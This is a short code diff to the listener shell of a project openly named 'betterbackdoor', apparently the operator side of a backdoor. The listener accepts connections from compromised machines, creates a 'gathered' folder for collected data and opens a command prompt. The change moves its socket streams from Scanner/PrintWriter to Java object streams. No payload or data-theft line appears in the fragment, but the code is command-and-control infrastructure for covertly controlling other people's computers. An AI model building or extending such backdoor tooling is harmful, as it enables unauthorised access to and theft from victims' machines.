@@ -3,17 +3,17 @@ package com.thatcherdev.betterbackdoor.shell;
 import com.thatcherdev.betterbackdoor.BetterBackdoor;
 
 import java.io.File;
-import java.io.PrintWriter;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.ArrayList;
-import java.util.Scanner;
 
 public class Shell {
 
 	private static Socket socket;
-	public static Scanner in;
-	public static PrintWriter out;
+	public static ObjectInputStream in;
+	public static ObjectOutputStream out;
 	public static ArrayList<Socket> connectedMachines = new ArrayList<>();
 
 	/**
@@ -34,7 +34,7 @@ public class Shell {
 				Thread.sleep(5000);
 				connector.interrupt();
 				if (connectedMachines.size() == 0)
-					System.out.println("No clients found. Searching again...");
+					System.out.println("No clients found. Searching again...\n");
 			}
 
 			if (connectedMachines.size() == 1)
@@ -55,8 +55,8 @@ public class Shell {
 			}
 			connectedMachines.clear();
 
-			in = new Scanner(socket.getInputStream());
-			out = new PrintWriter(socket.getOutputStream(), true);
+			out = new ObjectOutputStream(socket.getOutputStream());
+			in = new ObjectInputStream(socket.getInputStream());
 			new File("gathered").mkdir();
 			System.out.println("Connection has been established to " + socket.getInetAddress());
 			System.out.println("Enter 'help' for a list of available commands");
